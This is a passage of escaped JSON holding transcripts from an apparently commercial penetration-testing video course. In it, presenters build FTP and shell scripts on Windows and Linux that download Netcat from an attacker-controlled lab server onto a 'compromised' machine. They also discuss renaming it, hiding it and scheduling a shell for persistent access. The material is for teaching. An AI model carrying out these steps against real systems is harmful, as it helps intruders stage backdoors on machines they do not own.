00:15:09.331\nWe're gonna create a file that\nhas a bunch of FTP commands.\n\n309\n00:15:09.331 --> 00:15:12.645\nAnd because I can't use\nsomething interactive like Edit.\n\n310\n00:15:12.645 --> 00:15:16.560\nI can't jump open Notepad and\nhave it open up.\n\n311\n00:15:16.560 --> 00:15:20.906\nThere's nothing cool,\nlike what we have in Linux.\n\n312\n00:15:20.906 --> 00:15:23.576\nWhere there's command line editors and\nthings of that nature.\n\n313\n00:15:23.576 --> 00:15:25.777\nThere's one that's Edit, but\nit doesn't work, I tried it.\n\n314\n00:15:25.777 --> 00:15:30.447\n&gt;&gt; [LAUGH]\n&gt;&gt; It goes weird.\n\n315\n00:15:30.447 --> 00:15:36.440\nSo, that being the case I have to Echo\nthings into the input of a file and\n\n316\n00:15:36.440 --> 00:15:40.780\nthen append that file continually until\nI have built the file that I need.\n\n317\n00:15:40.780 --> 00:15:41.770\nSo that's what we're gonna do.\n\n318\n00:15:42.990 --> 00:15:43.630\nWe'll use Echo.\n\n319\n00:15:43.630 --> 00:15:45.130\nSo Echo will start here.\n\n320\n00:15:45.130 --> 00:15:51.498\nOpen and this is our standard FTP\ncommands you'll see is very simple here.\n\n321\n00:15:51.498 --> 00:15:59.684\nAnd we're going to open to my\nFTP server 192.168.219.146.\n\n322\n00:15:59.684 --> 00:16:03.512\nYou can add the port number if you\nwould like, if you scan the box and Or\n\n323\n00:16:03.512 --> 00:16:06.551\nyou're running your FTP server\non a different port for\n\n324\n00:16:06.551 --> 00:16:10.940\nwhatever reason, maybe security\nthrough obscurity kind of thing.\n\n325\n00:16:10.940 --> 00:16:12.530\nThat's fine,\njust add the port right there.\n\n326\n00:16:12.530 --> 00:16:14.140\nI'll put 21 and\njust leave it for you guys.\n\n327\n00:16:14.140 --> 00:16:18.860\nAnd if you use a single greater than,\nbe careful doing this.\n\n328\n00:16:18.860 --> 00:16:23.790\nIf you use a single greater than,\nthat writes to the file.\n\n329\n00:16:23.790 --> 00:16:25.040\nIf there's anything in that file,\n\n330\n00:16:25.040 --> 00:16:28.110\nit writes over that file and\nsays this is what goes in there, right.\n\n331\n00:16:28.110 --> 00:16:32.270\nAfter this we're going to append to\nthe file, using two greater than signs,\n\n332\n00:16:32.270 --> 00:16:32.915\nall right.\n\n333\n00:16:32.915 --> 00:16:34.500\nSo keep that in mind.\n\n334\n00:16:34.500 --> 00:16:37.240\nDon't keep using the greater than singly.\n\n335\n00:16:37.240 --> 00:16:38.643\nAnd thinking you've written your file,\n\n336\n00:16:38.643 --> 00:16:41.094\nyour going to have just the last line\nof your file going to go what is this.\n\n337\n00:16:41.094 --> 00:16:41.900\n[LAUGH] Right.\n\n338\n00:16:41.900 --> 00:16:44.890\nSo the first line that\nyou need to start with,\n\n339\n00:16:44.890 --> 00:16:48.450\nyou just start the file and\nthen just name your file.\n\n340\n00:16:48.450 --> 00:16:51.390\nSo echo open, ftp 21 and then we'll\n\n341\n00:16:54.110 --> 00:16:59.220\ncall it ftp dot Txt like that.\n\n342\n00:16:59.220 --> 00:17:03.380\nI'll hit return and now I didn't\nget any errors I do a dir I now\n\n343\n00:17:03.380 --> 00:17:08.690\nhave an ftp.txt file which I did\nnot have before so that's good.\n\n344\n00:17:08.690 --> 00:17:09.850\nIt is there.\n\n345\n00:17:09.850 --> 00:17:12.150\nYou gotta kinda blindly hope that\nyou typed everything correctly so\n\n346\n00:17:12.150 --> 00:17:13.840\njust be careful as you're typing.\n\n347\n00:17:13.840 --> 00:17:16.804\nTrust me I did this like three times,\nwhy is this stupid thing not working?\n\n348\n00:17:16.804 --> 00:17:20.543\nAnd you're typing things,\nyou can't see very well what's going on,\n\n349\n00:17:20.543 --> 00:17:22.237\nit can be a little frustrating.\n\n350\n00:17:22.237 --> 00:17:25.300\nSo just be careful when you're typing.\n\n351\n00:17:25.300 --> 00:17:32.100\nAll right, let's echo user,\necho sheco, echo user, like that.\n\n352\n00:17:32.100 --> 00:17:35.832\nAnd then we're gonna give it the username,\nmy username is FTP2.\n\n353\n00:17:35.832 --> 00:17:37.240\nAnd then we're going append.\n\n354\n00:17:37.240 --> 00:17:42.291\nRemember, double greater\nthan signs to txt dot.\n\n355\n00:17:42.291 --> 00:17:45.871\nI'm sorry, FTP.txt, that's funny.\n\n356\n00:17:45.871 --> 00:17:49.170\nAnd you'll notice that I didn't\ngive a space after that.\n\n357\n00:17:49.170 --> 00:17:51.850\nI do think that that's\nimportant here because it would\n\n358\n00:17:51.850 --> 00:17:54.570\ninterpret that space as\npart of the username maybe.\n\n359\n00:17:54.570 --> 00:17:58.040\nSo what certain commands I'll space and\nsome I won't.\n\n360\n00:17:58.040 --> 00:18:00.720\nJust if it doesn't work,\ntry it again without the space and\n\n361\n00:18:00.720 --> 00:18:02.391\nmaybe you'll get a little further.\n\n362\n00:18:02.391 --> 00:18:05.372\nHere I think the username is\nvery important on that one.\n\n363\n00:18:05.372 --> 00:18:09.805\nSo ECHO user\n&gt;&gt; ftp2 Good to go, no errors.\n\n364\n00:18:09.805 --> 00:18:10.544\nEverything looks good.\n\n365\n00:18:10.544 --> 00:18:12.625\nI'm gonna echo what the password is,\n\n366\n00:18:12.625 --> 00:18:15.950\ncuz at this point it's gonna\nprompt the user for a password.\n\n367\n00:18:15.950 --> 00:18:18.300\nWe just wanna feed that through\nour little script file here.\n\n368\n00:18:19.640 --> 00:18:25.729\nAnd the super secret password is,\nI can't even type it.\n\n369\n00:18:25.729 --> 00:18:26.315\nThere we go.\n\n370\n00:18:26.315 --> 00:18:28.554\nP-a-s-s-w-0-r-d-1.\n\n371\n00:18:28.554 --> 00:18:30.043\nHit return.\n\n372\n00:18:30.043 --> 00:18:31.430\nAs you can see it just did that.\n\n373\n00:18:31.430 --> 00:18:34.600\nAnd of course I can't hit up,\nI have to actually retype everything.\n\n374\n00:18:34.600 --> 00:18:36.580\nRemember, crazy stinking terminals, right,\n\n375\n00:18:36.580 --> 00:18:38.980\nthey get shovelled it\ndoesn't work as normal.\n\n376\n00:18:38.980 --> 00:18:45.890\nSo P@ssw0rd1 and\nthen remember to append that to ftp.txt.\n\n377\n00:18:45.890 --> 00:18:47.180\nThere we go, that's gonna help out.\n\n378\n00:18:48.190 --> 00:18:52.945\nThen we're gonna echo bin, echo bin And\n\n379\n00:18:52.945 --> 00:18:58.370\nftp.txt, that's a strange name for\nthe file.\n\n380\n00:18:58.370 --> 00:19:00.710\nBin just says, change to binary\nmode if you're not there already,\n\n381\n00:19:00.710 --> 00:19:02.600\nbecause that can help in file transfers.\n\n382\n00:19:02.600 --> 00:19:05.760\nsometimes they won't allow\nit unless you've done that.\n\n383\n00:19:05.760 --> 00:19:11.820\nAnd then we'll echo the get command,\nget.nc.enc\n\n384\n00:19:11.820 --> 00:19:17.160\nWhich is our Netcat then ftp.txt.\n\n385\n00:19:17.160 --> 00:19:23.230\nAnd then we will echo bye, which is\nthe basically close the command here.\n\n386\n00:19:23.230 --> 00:19:28.140\nAnd append that to ftp.txt.\n\n387\n00:19:28.140 --> 00:19:30.317\nAll right, now we have our file created.\n\n388\n00:19:30.317 --> 00:19:32.055\nHopefully I typed everything correctly,\n\n389\n00:19:32.055 --> 00:19:34.285\notherwise we're gonna have\nto type it all over again.\n\n390\n00:19:34.285 --> 00:19:35.932\n&gt;&gt; [LAUGH]\n&gt;&gt; Which is not fun.\n\n391\n00:19:35.932 --> 00:19:37.720\n[LAUGH] And now we fire off our command.\n\n392\n00:19:37.720 --> 00:19:38.650\nRemember, it was ftp.\n\n393\n00:19:38.650 --> 00:19:45.040\nWe want a -v to suppress any input or\ntalking from the server.\n\n394\n00:19:45.040 --> 00:19:46.340\nWe don't wanna see that.\n\n395\n00:19:46.340 --> 00:19:52.160\nAnd then -n to suppress it trying\nto log in with the current user.\n\n396\n00:19:52.160 --> 00:19:52.876\nDon't want that.\n\n397\n00:19:52.876 --> 00:20:00.210\nThen -s:FTP.txt and then drumroll please.\n\n398\n00:20:00.210 --> 00:20:02.900\nOkay, good,\nlooks like everything worked correctly.\n\n399\n00:20:02.900 --> 00:20:03.810\nI have no errors.\n\n400\n00:20:03.810 --> 00:20:06.890\nI see that it said login was successful.\n\n401\n00:20:06.890 --> 00:20:08.880\nIt changed to binary mode.\n\n402\n00:20:08.880 --> 00:20:11.890\nIt got nc.exe,\nport command was successful.\n\n403\n00:20:12.910 --> 00:20:14.540\nThe transfer was complete.\n\n404\n00:20:14.540 --> 00:20:15.634\nAnd this is how many bytes it was.\n\n405\n00:20:15.634 --> 00:20:16.984\nAnd then it exited, goodbye.\n\n406\n00:20:16.984 --> 00:20:18.720\nI do a dir.\n\n407\n00:20:18.720 --> 00:20:22.340\nAnd now I have Netcat installed,\nI can move it, rename it,\n\n408\n00:20:22.340 --> 00:20:24.150\ndo whatever I want to this system and\n\n409\n00:20:24.150 --> 00:20:29.560\nstart using it as a part of maybe a script\nor a scheduled task, something like that.\n\n410\n00:20:29.560 --> 00:20:32.550\nSo that it will do something for\nme, maybe create a shell.\n\n411\n00:20:32.550 --> 00:20:35.220\nThat waits for me to connect\nto it at certain times of day.\n\n412\n00:20:35.220 --> 00:20:36.340\nThings of that nature.\n\n413\n00:20:36.340 --> 00:20:37.920\nNow I can maintain some access.\n\n414\n00:20:37.920 --> 00:20:40.650\nI can hide that somewhere\nthat might not be found.\n\n415\n00:20:40.650 --> 00:20:44.847\nI can rename that something that's not so\nobvious as nc.exe.\n\n416\n00:20:44.847 --> 00:20:46.665\nEven though that's not really descriptive,\n\n417\n00:20:46.665 --> 00:20:48.721\nbut anybody within the know\nwould know what that is.\n\n418\n00:20:48.721 --> 00:20:49.771\n&gt;&gt; Right, right.\n\n419\n00:20:49.771 --> 00:20:51.460\nAnd not too terribly difficult.\n\n420\n00:20:51.460 --> 00:20:55.040\nI mean, there were some steps we had\nto go through to get it ready and\n\n421\n00:20:55.040 --> 00:20:58.770\nGetting those commands in that text file\nis maybe not the most intuitive, but\n\n422\n00:20:58.770 --> 00:21:00.090\nonce you've done that once or twice.\n\n423\n00:21:00.090 --> 00:21:03.970\nI mean piping text into a text\nfile is pretty darn easy, and\n\n424\n00:21:03.970 --> 00:21:05.740\nyou saw how quickly we\ngot that cat over there.\n\n425\n00:21:05.740 --> 00:21:09.640\n&gt;&gt; Yeah, nothing to it as long\nas you get your syntax correct,\n\n426\n00:21:09.640 --> 00:21:10.590\neverything should work fine.\n\n427\n00:21:10.590 --> 00:21:12.880\nMake sure that your FTP server is running.\n\n428\n00:21:12.880 --> 00:21:16.090\nMake sure that your user is correct,\nfor you to type the password correct.\n\n429\n00:21:16.090 --> 00:21:18.430\nAnd everything should go gravy for you.\n\n430\n00:21:18.430 --> 00:21:21.600\nOkay now let's Windows,\nright there's the Windows world.\n\n431\n00:21:21.600 --> 00:21:24.780\nI did say I was gonna try to do the TFTP.\n\n432\n00:21:24.780 --> 00:21:27.260\nLet's give that a worldly gig,\nwhat the heck.\n\n433\n00:21:27.260 --> 00:21:33.929\nLet me fire it up the TFTP\nserver here which is ATFTP,\n\n434\n00:21:33.929 --> 00:21:40.296\nI'll bump this for you guys so\nyou can see ATFTPD,\n\n435\n00:21:40.296 --> 00:21:44.694\nthat's right, --daemon, and\n\n436\n00:21:44.694 --> 00:21:50.170\nthen what port, I want to get on port 69.\n\n437\n00:21:50.170 --> 00:21:54.690\nAnd then slash whatever the root\ndirectory I gave for this,\n\n438\n00:21:54.690 --> 00:21:58.480\nwhich was tftp/tftp so right off the root.\n\n439\n00:21:58.480 --> 00:22:02.920\nFire that up, should be going now.\n\n440\n00:22:02.920 --> 00:22:08.032\nIf I go back over to my machine,\nI should be able to say I'm gonna\n\n441\n00:22:08.032 --> 00:22:12.673\ndelete nc.exe and\nthen I'm going to try to do tftp here.\n\n442\n00:22:12.673 --> 00:22:16.872\nSo tftp-i, then the server address\n\n443\n00:22:16.872 --> 00:22:21.481\n192.168.219.1:46.\n\n444\n00:22:21.481 --> 00:22:22.150\nAnd I'm going to say, is that everything?\n\n445\n00:22:22.150 --> 00:22:23.240\nYeah then you just get.\n\n446\n00:22:23.240 --> 00:22:24.940\nI never remember if it's inline.\n\n447\n00:22:24.940 --> 00:22:27.409\nI think it is inline.\n\n448\n00:22:27.409 --> 00:22:30.749\nGet nc.exe.\n\n449\n00:22:30.749 --> 00:22:35.240\nThere you go so\nTFTP is not installed on this machine.\n\n450\n00:22:35.240 --> 00:22:36.270\nSo like I said,\n\n451\n00:22:36.270 --> 00:22:41.550\nCan't always rely on TFTPB in there even\nthough it's a whole lot easier, obviously.\n\n452\n00:22:41.550 --> 00:22:43.900\nSo if is available, use that.\n\n453\n00:22:43.900 --> 00:22:47.530\nIf not, now you know how to use\nFTP to get around that problem.\n\n454\n00:22:47.530 --> 00:22:50.080\n&gt;&gt; Fantastic, all right,\nnow we want to try to do it the other way?\n\n455\n00:22:50.080 --> 00:22:51.320\n&gt;&gt; Yeah, let's go Linux.\n\n456\n00:22:51.320 --> 00:22:54.527\nRight, so\nLinux might be the box you've exploited.\n\n457\n00:22:54.527 --> 00:22:55.064\nHow do we do that?\n\n458\n00:22:55.064 --> 00:22:59.350\nWe have to write a batch or\na script, a shell script.\n\n459\n00:22:59.350 --> 00:23:01.260\nThis isn't actually a batch script,\n\n460\n00:23:01.260 --> 00:23:06.390\nthis is a shell script just cuz it\nseemed to be a little easier for me.\n\n461\n00:23:06.390 --> 00:23:09.616\nAnd shells, the bin/sh,\n\n462\n00:23:09.616 --> 00:23:14.890\nthe old shell it might be around,\nbatch might not be the environment.\n\n463\n00:23:14.890 --> 00:23:18.670\nI know it's very ubiquitous, but\nbatch might not be the environment So\n\n464\n00:23:18.670 --> 00:23:23.050\njust going bin/sh is a little safer so\nwhich is why I used it here.\n\n465\n00:23:23.050 --> 00:23:30.860\nAll right, so let's do that, let's\nstart creating our, what's it called?\n\n466\n00:23:30.860 --> 00:23:31.360\nA script.\n&gt;&gt; [LAUGH]\n\n467\n00:23:31.360 --> 00:23:32.316\n&gt;&gt; Our shell script,\n\n468\n00:23:32.316 --> 00:23:36.099\nthis word is just not coming to my brain\ntoday, got so many things going on.\n\n469\n00:23:36.099 --> 00:23:37.564\nAll right, so let's see here,\n\n470\n00:23:37.564 --> 00:23:40.098\nI don't think I have a shell script here.\nI actually do.\n\n471\n00:23:40.098 --> 00:23:40.788\n[LAUGH] Well,\n\n472\n00:23:40.788 --> 00:23:45.880\nI'll call FTP 2, cuz there's my, I already\ndid this just for testing purposes.\n\n473\n00:23:45.880 --> 00:23:48.650\nI'll called it ftp.sh.\n\n474\n00:23:48.650 --> 00:23:53.410\nAnd I'll call this one ftp2.sh so\nwe can keep them squared away.\n\n475\n00:23:53.410 --> 00:23:54.181\n&gt;&gt; All right.\n\n476\n00:23:54.181 --> 00:23:56.641\n&gt;&gt; So what we do is we're going to\nuse Echo just like we did before.\n\n477\n00:23:56.641 --> 00:24:00.630\nAnd we're, for intense purposes,\nhere let me set the stage really quickly.\n\n478\n00:24:00.630 --> 00:24:02.242\nThis prompt right here,\n\n479\n00:24:02.242 --> 00:24:07.560\nlet's say that that is unexploited\nmachine prompts and not this local user.\n\n480\n00:24:07.560 --> 00:24:10.030\nBut the process is still the same.\n\n481\n00:24:10.030 --> 00:24:12.180\nOkay.\nSo just put it in your mind's eye,\n\n482\n00:24:12.180 --> 00:24:17.290\nwe are logged in remotely to\nan exploited machine and not normally.\n\n483\n00:24:17.290 --> 00:24:19.440\nOkay, from there,\neverything else is the same.\n\n484\n00:24:19.440 --> 00:24:22.080\nSo all you have to do is exploit\nthe machine once you get the prompt.\n\n485\n00:24:22.080 --> 00:24:24.140\nThen you start from this process, right?\n\n486\n00:24:25.410 --> 00:24:28.130\nThere we go.\nSo, now we're gonna use echo and I say put\n\n487\n00:24:29.430 --> 00:24:34.400\nthis in here it is not like that\nslash bin, slash s h put that.\n\n488\n00:24:34.400 --> 00:24:40.110\nAnd then of course I'll\nput that to ftp2.sh.\n\n489\n00:24:40.110 --> 00:24:40.730\nHere we go.\n\n490\n00:24:40.730 --> 00:24:43.785\nWe don't get the same kind of output\nthat you do in Windows but that's okay,\n\n491\n00:24:43.785 --> 00:24:45.200\nas long as we don't get the errors.\n\n492\n00:24:45.200 --> 00:24:47.830\nAnd you can always cat the file as well.\n\n493\n00:24:47.830 --> 00:24:50.445\nThat's something that is\nnot inside of Windows.\n\n494\n00:24:50.445 --> 00:24:51.860\n&gt;&gt; [LAUGH]\n&gt;&gt; So I can cat and\n\n495\n00:24:51.860 --> 00:24:53.550\nmake sure that that line\ngot written correctly.\n\n496\n00:24:53.550 --> 00:24:56.859\nIt's cat ftp2, two each.\n\n497\n00:24:56.859 --> 00:24:59.670\nAnd I can see that's the first line,\ncuz that's how you start a shell script.\n\n498\n00:25:00.760 --> 00:25:02.490\nAnd let's just crank through it here.\n\n499\n00:25:02.490 --> 00:25:07.341\nEcho, let's see here, I'm gonna\ncreate some variables, right yeah.\n\n500\n00:25:07.341 --> 00:25:11.729\nHost = 192.1, actually I'm just gonna use\n\n501\n00:25:11.729 --> 00:25:16.224\nthe local hosts here cuz\nthat's where I'm going.\n\n502\n00:25:16.224 --> 00:25:21.751\n.1 I think I do need to put some\nquotations around that single\n\n503\n00:25:21.751 --> 00:25:26.746\nquotes because of the periods\nin between the numbers and\n\n504\n00:25:26.746 --> 00:25:29.420\nthen append that to the file.\n\n505\n00:25:29.420 --> 00:25:34.255\nftp2.sh and I'll echo user equals,\n\n506\n00:25:34.255 --> 00:25:39.676\nyeah just to keep it\nall squared away ftp2,\n\n507\n00:25:39.676 --> 00:25:43.054\nappend that to ftp2.sh.\n\n508\n00:25:43.054 --> 00:25:48.010\nSo now we create a couple of variables\nwhat the host is, what the username is so\n\n509\n00:25:48.010 --> 00:25:52.910\nthat I can declare the variables instead\nof manually imputing in the stuff.\n\n510\n00:25:54.330 --> 00:26:00.020\nNow I will say echo.ftp, so\nthis is where I'm actually invoking ftp.\n\n511\n00:26:00.020 --> 00:26:03.080\nYou gotta remember I'm creating a file,\nI'm not doing it right now.\n\n512\n00:26:03.080 --> 00:26:06.864\nOnce the script runs, it will invoke ftp,\nand I gotta give it that command.\n\n513\n00:26:06.864 --> 00:26:07.788\nThat's what we're doing right this second.\n\n514\n00:26:07.788 --> 00:26:15.210\nSo ftp-v-n, and this,\nin this one, the v is verbose.\n\n515\n00:26:15.210 --> 00:26:17.010\nSo I get some output.\n\n516\n00:26:17.010 --> 00:26:19.940\nI had to use it for troubleshooting,\nit was very helpful.\n\n517\n00:26:19.940 --> 00:26:22.940\nSo if you're having trouble\nthrow that -v in there.\n\n518\n00:26:22.940 --> 00:26:26.163\nI just like it, and\nyou know me I'm verbose kind of person.\n\n519\n00:26:26.163 --> 00:26:27.370\n&gt;&gt; [LAUGH] Not you Dan.\n\n520\n00:26:27.370 --> 00:26:28.210\n&gt;&gt; Not me.\n\n521\n00:26:28.210 --> 00:26:28.950\nNo sir.\n\n522\n00:26:28.950 --> 00:26:30.470\nI never talk.\n\n523\n00:26:30.470 --> 00:26:31.675\nAs quiet as a church mouse.\n\n524\n00:26:31.675 --> 00:26:32.820\n&gt;&gt; [LAUGH]\n&gt;&gt; Let's see here,\n\n525\n00:26:32.820 --> 00:26:36.990\nand then END_SCRIPT, do this.\n\n526\n00:26:36.990 --> 00:26:41.080\nAnd this is gonna look weird, and you're\nlike, hold on man, that looks weird.\n\n527\n00:26:41.080 --> 00:26:44.640\nSo let me just show you\nwhat's going on here.\n\n528\n00:26:44.640 --> 00:26:46.820\nYou notice I started\nwith a single quote here.\n\n529\n00:26:46.820 --> 00:26:50.040\nAnd then I did to less\nthan signs END_SCRIPT and\n\n530\n00:26:50.040 --> 00:26:53.700\nthen ended my single quote and then the\ndouble greater than thing going on here.\n\n531\n00:26:53.700 --> 00:26:57.180\nLet me raise this over here so\nyou guys can see this better.\n\n532\n00:26:57.180 --> 00:26:59.415\nAnd they don't have to kill\nmy tiny head talking to you.\n\n533\n00:26:59.415 --> 00:27:01.930\n&gt;&gt; [LAUGH]\n&gt;&gt; What's happening is,\n\n534\n00:27:01.930 --> 00:27:03.440\nis I'm redirecting.\n\n535\n00:27:03.440 --> 00:27:07.210\nThis is what's called, my goodness,\nwhat's the name of this?\n\n536\n00:27:07.210 --> 00:27:10.900\nBasically what I'm doing is I can't\nthink of the actual official things for\n\n537\n00:27:10.900 --> 00:27:12.130\nthese things off the top\nof my head right now.\n\n538\n00:27:12.130 --> 00:27:15.840\nBut what I'm doing is I'm saying I'm\ngoing to input some commands and\n\n539\n00:27:15.840 --> 00:27:19.170\nyou'll know its the end of those\ncommands because I'm going to,\n\n540\n00:27:19.170 --> 00:27:21.170\nthe last thing you'll see is end script.\n\n541\n00:27:21.170 --> 00:27:22.880\nYou can make and say anything you want.\n\n542\n00:27:22.880 --> 00:27:26.312\nI'm just using end script\nbecause it's descriptive.\n\n543\n00:27:26.312 --> 00:27:28.729\nSo I'm inputting that\ninto the FTP command.\n\n544\n00:27:28.729 --> 00:27:33.401\nSo once it runs through this list of\ncommands, as soon as it sees end script,\n\n545\n00:27:33.401 --> 00:27:36.833\nit knows that it is done,\nit stops processing command,\n\n546\n00:27:36.833 --> 00:27:38.817\nit comes to the end of it, okay?\n\n547\n00:27:38.817 --> 00:27:43.608\nSo and then I'm appending that to the file\nwhich is the double greater thans,\n\n548\n00:27:43.608 --> 00:27:44.945\nremember all right.\n\n549\n00:27:44.945 --> 00:27:46.660\nSo append the file.\n\n550\n00:27:46.660 --> 00:27:48.120\nAll good, let me hit enter there.\n\n551\n00:27:48.120 --> 00:27:51.460\nEcho, what are we doing next here?\n\n552\n00:27:51.460 --> 00:27:53.888\n&gt;&gt; User.\n&gt;&gt; We're gonna do our, yup, our user.\n\n553\n00:27:53.888 --> 00:27:58.910\nUser is $USER, so\n\n554\n00:27:58.910 --> 00:28:03.875\nthere take a variable and don't\nforget our single quotes, bing, bang.\n\n555\n00:28:03.875 --> 00:28:08.120\nTo ftp2.sh,\n\n556\n00:28:08.120 --> 00:28:11.600\nthere we go.\n\n557\n00:28:11.600 --> 00:28:17.072\nAnd then we're gonna do our get command,\nso echo\n\n558\n00:28:17.072 --> 00:28:22.974\nthen our get and then whatever you\nwant to be, so this will be nc.exe.\n\n559\n00:28:24.770 --> 00:28:25.439\nLet me close that out.\n\n560\n00:28:25.439 --> 00:28:30.476\nI came out to the file ftp2.sh and\nthen we will\n\n561\n00:28:30.476 --> 00:28:35.652\necho our quick command which is bye,\nb-y-e.\n\n562\n00:28:35.652 --> 00:28:38.940\nI'm using a single quotes because it\nseemed to work a whole lot better for me.\n\n563\n00:28:38.940 --> 00:28:42.650\nI was getting some command not found\nkind of stuff when I didn't use those.\n\n564\n00:28:42.650 --> 00:28:46.068\nSo I threw those on there and\nit worked out a whole lot better.\n\n565\n00:28:46.068 --> 00:28:49.289\nAppend that to ftp2.sh.\n\n566\n00:28:49.289 --> 00:28:52.890\nAnd then we do our echo.\n\n567\n00:28:52.890 --> 00:28:54.800\nThis is where I put in\nthat end script thing.\n\n568\n00:28:55.910 --> 00:29:03.250\nSo I say END_SCRIPT, make sure I spelled\nit like I did before, looks like I did.\n\n569\n00:29:03.250 --> 00:29:09.540\nAnd then append that to ftp2.sh,\nand then I think that's it.\n\n570\n00:29:09.540 --> 00:29:10.870\nI think that's all.\n\n571\n00:29:10.870 --> 00:29:12.140\nThat looks like my script.\n\n572\n00:29:12.140 --> 00:29:15.370\nIf I'm looking at it correctly, everything\nlooks like it's supposed to look.\n\n573\n00:29:15.370 --> 00:29:18.110\nHopefully I didn't miss any characters\nthat are just not glaring me\n\n574\n00:29:18.110 --> 00:29:19.610\nin the face right now.\n\n575\n00:29:19.610 --> 00:29:23.204\nWe do have to make our\nscript executable so\n\n576\n00:29:23.204 --> 00:29:27.312\nrun your chmod+x on your script, ftp2.sh,\n\n577\n00:29:27.312 --> 00:29:33.390\nremember it's gotta be executable so\nthat you can execute it.\n\n578\n00:29:33.390 --> 00:29:34.935\nAnd then sir, fire away.\n\n579\n00:29:34.935 --> 00:29:35.760\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n580\n00:29:35.760 --> 00:29:39.768\nthen, let's make sure\nnc.exe isn't already here.\n\n581\n00:29:39.768 --> 00:29:43.230\nLs, sure, yeah, not there.\n\n582\n00:29:43.230 --> 00:29:46.062\nSo now we can fire away.\n\n583\n00:29:46.062 --> 00:29:51.520\n/stp2.sh, it's asking me for\nthe password, I can type that in.\n\n584\n00:29:51.520 --> 00:29:53.987\nP @ ssw0 rd1.\n\n585\n00:29:53.987 --> 00:29:55.290\nAnd there you go.\n\n586\n00:29:55.290 --> 00:29:56.130\nTransfer the file.\n\n587\n00:29:56.130 --> 00:30:00.500\nIf I do an ls-lanc.exe.\n\n588\n00:30:00.500 --> 00:30:03.960\nThere it is, I've now successfully\ndownloaded the file, and I just used it.\n\n589\n00:30:03.960 --> 00:30:07.610\nYou can create batch scripts or\nshell scripts as you're logged into those\n\n590\n00:30:07.610 --> 00:30:10.020\nexploited shells that\nyou've gained access to.\n\n591\n00:30:10.020 --> 00:30:16.720\nSo there you go, how to do FTP downloads\nusing a script file in Windows,\n\n592\n00:30:16.720 --> 00:30:21.010\nand how to create a shell script inside\nof Linux to do the exact same thing.\n\n593\n00:30:21.010 --> 00:30:23.829\n&gt;&gt; Well folks he wasn't lying,\nhe made file transfer fun, did he not?\n\n594\n00:30:23.829 --> 00:30:24.490\nI love it.\n\n595\n00:30:24.490 --> 00:30:28.260\nAll right Daniel,\ngreat demonstrations there.\n\n596\n00:30:28.260 --> 00:30:29.790\nOnce we have compromised the machine,\n\n597\n00:30:29.790 --> 00:30:32.550\nwhat is the next step,\nwe wanna maintain that access.\n\n598\n00:30:32.550 --> 00:30:35.040\nAnd the way you do that is to get\nsome files over there, right?\n\n599\n00:30:35.040 --> 00:30:37.450\nWe need those back door\nprograms which most likely\n\n600\n00:30:37.450 --> 00:30:41.350\ndon't reside currently on those machines,\nso we need to get them there somehow.\n\n601\n00:30:41.350 --> 00:30:42.490\nAnd now we know how.\n\n602\n00:30:42.490 --> 00:30:44.580\n&gt;&gt; Windows doesn't with\nSubSeven pre-installed?\n\n603\n00:30:44.580 --> 00:30:45.450\nIt's weird.\n&gt;&gt; You know, like I said,\n\n604\n00:30:45.450 --> 00:30:48.450\nunless your victim happens\nto be running Kali Linux,\n\n605\n00:30:48.450 --> 00:30:50.540\nmost of those tools are probably\nnot gonna be there, so.\n\n606\n00:30:50.540 --> 00:30:51.180\n&gt;&gt; Yeah.\n\n607\n00:30:51.180 --> 00:30:53.370\n&gt;&gt; All right, Daniel, we appreciate that,\ngreat demonstrations.\n\n608\n00:30:53.370 --> 00:30:55.800\nWe hope everybody out there\nenjoyed watching this one.\n\n609\n00:30:55.800 --> 00:30:58.760\nSigning out for ITPRO.TV,\nI've been your host Mike Rodrick.\n\n610\n00:30:58.760 --> 00:30:59.590\n&gt;&gt; And I'm Daniel Lowrie.\n\n611\n00:30:59.590 --> 00:31:00.401\nAnd we'll see you next time.\n\n612\n00:31:00.401 --> 00:31:07.985\n[MUSIC]\n\n613\n00:31:07.985 --> 00:31:13.729\n&gt;&gt; Thank you for watching ITPRO.TV.\n\n",
          "vimeoId": "202939086"
        },
        {
          "description": "In this episode, Dan and Mike demonstrate how to escalate privileges on a Windows system using two different methods. They first use an existing vulnerability to escalate privileges. Then they use a misconfigured task to accomplish privilege escalation.",
          "length": "1664",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-1-windows_privilege_escalation-020217-PGM.00_27_55_01.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-1-windows_privilege_escalation-020217-PGM.00_27_55_01.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-1-windows_privilege_escalation-020217-PGM.00_27_55_01.Still001-sm.jpg",
          "title": "Windows Privilege Escalation",
          "transcript": "WEBVTT\n\n1\n00:00:00.280 --> 00:00:08.273\nWelcome to ITProTV, I'm your host-\n&gt;&gt; [CROSSTALK]\n\n2\n00:00:08.273 --> 00:00:12.266\n&gt;&gt; You're watching ITProTV.\n\n3\n00:00:12.266 --> 00:00:15.862\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n4\n00:00:15.862 --> 00:00:19.406\nI'm your host Mike Rodrick, and\ntoday we're doing penetration testing.\n\n5\n00:00:19.406 --> 00:00:23.410\nAnd in this episode, we're gonna be\nlooking at escalating privileges.\n\n6\n00:00:23.410 --> 00:00:24.720\nAnd specifically in this one,\n\n7\n00:00:24.720 --> 00:00:27.450\nwe're gonna be looking at it\nfrom the Windows side of things.\n\n8\n00:00:27.450 --> 00:00:29.750\nWe'll do another one where\nwe take a look at Linux.\n\n9\n00:00:29.750 --> 00:00:33.600\nBut when we're talking about escalating\nprivileges, we might break into a box,\n\n10\n00:00:33.600 --> 00:00:36.270\nwe might be down here on\nthose privilege totem pole.\n\n11\n00:00:36.270 --> 00:00:39.580\nWe wanna get higher, or\nall the way to the top, maybe.\n\n12\n00:00:39.580 --> 00:00:41.600\nAnd who's gonna help us do that?\n\n13\n00:00:41.600 --> 00:00:43.800\nWell, Mr. Daniel Lowrie,\nwelcome back Daniel.\n\n14\n00:00:43.800 --> 00:00:45.290\n&gt;&gt; Mike, so glad to be back.\n\n15\n00:00:45.290 --> 00:00:48.620\nI'm glad to have the lovely\nviewers out there watching us.\n\n16\n00:00:48.620 --> 00:00:51.440\nHopefully you guys are like,\nyes, yes, finally.\n\n17\n00:00:51.440 --> 00:00:57.180\nCuz, yeah, I can gain some shell 